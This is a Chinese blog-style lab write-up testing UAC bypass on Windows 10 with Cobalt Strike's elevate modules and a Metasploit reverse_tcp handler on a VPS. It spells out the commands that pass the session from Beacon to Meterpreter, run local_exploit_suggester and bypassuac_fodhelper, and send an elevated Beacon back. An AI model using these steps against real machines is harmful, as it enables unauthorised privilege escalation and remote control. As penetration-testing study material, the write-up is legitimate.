2020/1/21更新：

CS 手册 4.0 中说：
> Cobalt Strike 附带了一些绕过 UAC 的攻击。但如果当前用户不是管理员，攻击会失效。要检查当前用户是否在管理员组里，使用 `run whoami /groups` 命令。

所以本文中使用 `uac-dll` 和 `uac-token-duplication` 这两个 CS 中注册的 bypass UAC 模块的姿势不对，**需要先提权，**至 `Administrator` 或者 `SYSTEM` 权限。然后再通过 `elevate` 命令使用这些 Bypass UAC 的模块。



------------------

原文：

# 0x01 前言

本文只是记录下基本操作。这些操作都是我在读 Cobalt Strike 官网的 CS 4.0 手册的过程中自己无中生有凭空想出来的，所以方法可能不是很主流，有点繁琐、操作较麻烦，但是也是我自己试了完全可行的。慢慢探索更简单的道路吧、本菜鸡对自己要求不是太高，注重对自己创造力的培养。

实验环境: Cobalt Strike 3.14 非试用版 
受害机器：有 360(`ZhuDongFangYu.exe`) 的 WIN10

本文看点:

- Cobalt Strike Elevate 模块 BypassUAC 方法测试
- MSF 和 CS 联动来 Bypass UAC
- MSF → Meterpreter 方向弹 shell

# 0x02 Cobalt Strike 中的提权命令

一些后渗透命令要求系统管理员级别的权限。Beacon 有几个帮助用户提升访问权限的选项。



**通过 elevate 命令利用漏洞提权**

输入 `elevate` 可以列出在 Cobalt Strike 中注册的权限提升漏洞。运行 `elevate [exploit listener]` 来尝试使用特定的漏洞利用来提权。

图形化的操作路径是：通过 `[beacon]` → `Access` → `Elevate` 来启动其中一个漏洞利用。

![title](https://leanote.com/api/file/getImage?fileId=5e23c049ab64411ab600150a)

如图，在 Cobalt Strike 3.14 非试用版中，`elevate` 模块内置了：

- ms14-058
- uac-dll
- uac-token-duplication

这三个模块。`ms14-058` 模块用于将 Windows 主机从普通用户权限直接提升到 System 权限。`uac-dll` 和 `uac-token-duplication` 模块用于协助渗透测试人员进行 bypassUAC 操作，具体尝试如下：

我的 `beacon_http/reverse_http` 监听器：


![title](https://leanote.com/api/file/getImage?fileId=5e23c017ab64411ab60014fe)


命令：

```
elevate uac-dll test1
elevate uac-token-duplication test1
```

# 0x03 使用 UAC-DLL 模块 Bypass UAC

当前 Beacon 没有过 UAC：

![title](https://leanote.com/api/file/getImage?fileId=5e23c2efab64411ab6001577)

使用 `uac-dll` bypassUAC：

![title](https://leanote.com/api/file/getImage?fileId=5e23c7b1ab64411ab6001651)




然后弹回一个 Beacon shell，成功 Bypass 了 UAC：

![title](https://leanote.com/api/file/getImage?fileId=5e23c98fab64411ab60016a5)

但其实这样很不现实，因为在 Bypass UAC 的过程中，会在目标主机上弹两个框，必须要对方点确定才可以，否则无法完成此操作：

![title](https://leanote.com/api/file/getImage?fileId=5e23c6b4ab64411ab6001624)

![title](https://leanote.com/api/file/getImage?fileId=5e23c6d6ab64411cb00015d3)


这可能是因为我用于 Bypass UAC 的 Beacon shell 是普通用户权限。但是这里我不想尝试先提权来看看能不能绕过这两个弹窗了，有点懒，想直接联动 MSF 来 BypassUAC。

# 0x04 联动 MSF 来使 CS Beacon Shell BypassUAC


在 [CobaltStrike&MetaSploit联动](http://blog.leanote.com/post/snowming/43cef4b64cbd) 这篇文章里，我提到过 Cobalt Strike 与 MSF 的联动，这里我就借助 MSF 的 `post/multi/recon/local_exploit_suggester` 来帮助 Cobalt Strike 的这个目标 BypassUAC：

*第一步： 在本地 MSF上创建监听器*

我在公网 VPS 上开了个 MSF，并创建如下监听器：

```
msf > use exploit/multi/handler 
msf > set payload windows/meterpreter/reverse_tcp 注: 此处的协议格式务必要和上面 cs 外部监听器的协议对应,不然 meter 是无法正常回连的 
msf > set lhost 144.*.*.70                        注：这里填本地 MSF 服务器的 IP 地址
msf > set lport 7777 
msf > exploit 
```

![title](https://leanote.com/api/file/getImage?fileId=5e23d840ab64411cb0001929)


*第二步： 在 CS 上创建外部监听器*

在 CS 上创建一个 tcp 的 foreign listener，回连端口设为 9999：
（TCP 就可以，如果是 HTTP 或 HTTPS，最好用域名而不是 IP）

![title](https://leanote.com/api/file/getImage?fileId=5e23d7ccab64411cb000190a)

*第三步：spawn*

派生会话的操作很简单：
对 Beacon 选择 spawn 选项,为其选择 MSF 的 listener `MSF_VPS` 作为参数。

回到本地 MSF，就会发现相应目标机器的 meterpreter 已经被直接弹回到了公网 MSF 上：

![title](https://leanote.com/api/file/getImage?fileId=5e23d7adab64411ab6001928)



总之，我们完成了这样一个操作，从而实现了从 CS Beacon 到公网 MSF meterpreter 的派生。



*第三点五步：因贫穷导致的小插曲*

本来这一步是要提权的，但是这个步骤真的一波三折。

在弹回来的 meterpreter 里面，使用提权推荐模块：

```
meterpreter > run post/multi/recon/local_exploit_suggester
```

此模块给出了一些提权建议。但是悲伤的故事发生了：内存不足。


![title](https://leanote.com/api/file/getImage?fileId=5e23d661ab64411cb00018c7)

因为我个人的贫穷，我一直用的我朋友的一台 低配 VPS（内存可能 512），所以我在这仅仅的一台 VPS 上同时开了 CS 团队服务器和 MSF，最终导致了内存不足的结果。

贫穷的我继续借 VPS。找一个表哥借了一个 VPS，但是这台机子腾讯云网页控制台层面的一些设置导致 MSF 公网 IP 的网卡监听失败，他人在途中暂时也没法改设置。借也借不到了，还是用本地 MSF 搭配 SSH 隧道吧......

![title](https://leanote.com/api/file/getImage?fileId=5e23f345ab64411cb0001deb)


派生会话之后我终于又一次见到了 meterpreter.....来之不易我要好好珍惜：

![title](https://leanote.com/api/file/getImage?fileId=5e23f3eaab64411ab6001e53)


*第四步：使用 MSF BypassUAC*

```
meterpreter > run post/multi/recon/local_exploit_suggester
```

![title](https://leanote.com/api/file/getImage?fileId=5e23f530ab64411ab6001ea1)

一个一个试呗。先用 `exploit/windows/local/bypassuac_eventvwr` 这个模块：

![title](https://leanote.com/api/file/getImage?fileId=5e23f619ab64411cb0001e79)

![title](https://leanote.com/api/file/getImage?fileId=5e23f69cab64411ab6001ee2)

![title](https://leanote.com/api/file/getImage?fileId=5e23f7f8ab64411ab6001f26)

`exploit` 之后不仅给我蹦出了下面这个页面，而且还没成功。这可能是因为某次尝试用 `eventvwr` 来 BypassUAC 之后，我当时乱改了注册表里面一些，搞完就没改回来......

![title](https://leanote.com/api/file/getImage?fileId=5e23f852ab64411cb0001eee)

![title](https://leanote.com/api/file/getImage?fileId=5e23f917ab64411ab6001f5a)

换个模块试试，尝试使用 `exploit/windows/local/bypassuac_fodhelper`：

![title](https://leanote.com/api/file/getImage?fileId=5e23fa5fab64411cb0001f5a)

![title](https://leanote.com/api/file/getImage?fileId=5e23fabfab64411cb0001f6d)

看上去此模块利用成功了：

![title](https://leanote.com/api/file/getImage?fileId=5e23fb9fab64411ab6001fe3)


*第五步：弹回一个 BypassUAC 的 Beacon 到 CS 团队服务器*

![title](https://leanote.com/api/file/getImage?fileId=5e24020aab64411cb00020be)
![title](https://leanote.com/api/file/getImage?fileId=5e24025bab64411ab600212a)

运行看起来很顺利，但是为什么我的 Cobalt Strike 那里没收到这个弹回来的 Beacon Shell 呢?
![title](https://leanote.com/api/file/getImage?fileId=5e24035bab64411cb0002100)

机智的我立刻发现了问题，上面那个 `lport` 的端口设错了，我在网上随便找到的 MSF shell 弹回 CS Beacon Shell 的方法，它写的端口是 50050，但是用脑子一想就不对啊。要弹回的肯定是 `reverse_tcp` 监听器的端口，这个监听器肯定不可能开在 50050 端口上啊，团队服务器都占用了不是？所以我很怀疑写那篇文章的人怎么弹回到 50050 端口的，除非他把团队服务器的默认端口改了......


总之，重新设置 `lport`，使其与 `windows/beacon_http/reverse_http` 监听器的端口对应：

![title](https://leanote.com/api/file/getImage?fileId=5e24053bab64411ab60021b5)

然后喜迎我的新 Beacon 来到，是 `pid` 为 40208 的那个 Beacon 嗷：

![title](https://leanote.com/api/file/getImage?fileId=5e24065fab64411ab60021ea)

直接 Bypass 了 UAC。因为我用的 payload 是 `exploit/windows/local/bypassuac_fodhelper`，就是一个绕 UAC 的 payload，所以这个 Beacon 是直接绕过了 UAC 的。 

![title](https://leanote.com/api/file/getImage?fileId=5e240c1bab64411ab600230f)

我本来想，先用 MSF 提权，然后尝试是否可以避开 CS 内置的 BypassUAC 方法 `uac-dll` 利用过程中的两个 UAC 弹窗。但是与其使用 MSF 提权然后绕这两个弹窗，我觉得不如直接用 MSF BypassUAC 一步到位。

总之我这里借助 MSF 来使 CS Beacon shell bypass UAC 的操作步骤是：

1. 我先对这个 CS Beacon shell 派生一个到 MSF 
2. 使用 MSF Bypass UAC
3. 弹回一个 Bypass UAC 的 Beacon shell 到 CS

理论上没什么问题，就是操作比较繁琐。据说一般会写的人是直接将 BypassUAC 集成在 CS 中。BypassUAC 我同事也跟我说了一个 Github 项目，奈何我不会用，先用这种繁琐的方法凑活着用吧。


#  0x05 使用 uac-token-duplication 模块 Bypass UAC

![title](https://leanote.com/api/file/getImage?fileId=5e241175ab64411cb00023b0)

第一感觉很好使啊，不卡不谈不跳直接获得了一个 pid 为 31820 的新 Beacon。显示一切顺利：

![title](https://leanote.com/api/file/getImage?fileId=5e2415a1ab64411cb0002461)

但结果没成功...... 判断有没有成功就看这里有没有星号：

![title](https://leanote.com/api/file/getImage?fileId=5e241643ab64411cb0002483)

或者对比一下就知道有没有过 UAC：

![title](https://leanote.com/api/file/getImage?fileId=5e241727ab64411cb00024ab)

![title](https://leanote.com/api/file/getImage?fileId=5e24170fab64411cb00024a7)


这个弹回来的 shell 没有过 UAC，也不知道啥原因，就这样吧。总之经测试此方法在 Win10（有360）上不生效。


#  0x06 总结

总结来说，Cobalt Strike 内置的两种 Bypass UAC 方法，测试结果如下：

- uac-dll：可绕 UAC，对普通用户级别的 Beacon Shell 不实用
- uac-token-duplication：测试失败

但是可以用联动 MSF 的 `post/multi/recon/local_exploit_suggester` 模块来 Bypass UAC，测试成功。

另外关于 UAC：

即使是管理员，也只有 Administrator 可以免 UAC；
其它都得绕，不然就是通过提权。

比如我的最开始的 Beacon 中，`xue` 这个普通用户属于管理员组：

![title](https://leanote.com/api/file/getImage?fileId=5e241512ab64411ab60024dc)

但是其没过 UAC：

![title](https://leanote.com/api/file/getImage?fileId=5e241892ab64411ab6002584)


Windows 7 以后默认不启用 Administrator 用户估计也是这个原因，不然 UAC 等于没用。


# 0x07 后续学习

关于 UAC 的学习路线：

1. UAC 是什么
2. 什么情况下会出现 UAC
3. 针对不同的系统版本怎么正常绕 UAC
4. 针对不同的系统版本怎么免杀绕 UAC
5. 绕过 UAC 之后怎么免杀执行自己的 payload

另外 CS 的这个 `Elevate` 提权模块还有个 `runasadmin` 命令，对于 Elevate Exploit 也可以自行编写代码来扩充，这些我都还没搞清楚，搞清楚了再记录、交流。



---------------------

参考文档：

1. [cobalt strike和metasploit结合使用(互相传递shell会话)](http://www.freesion.com/article/22873048/)，灰信网，卿先生，2019年5月27日
2. [Cobalt Strike mannual 4.0](https://www.cobaltstrike.com/downloads/csmanual40.pdf)，Cobalt Strike 官网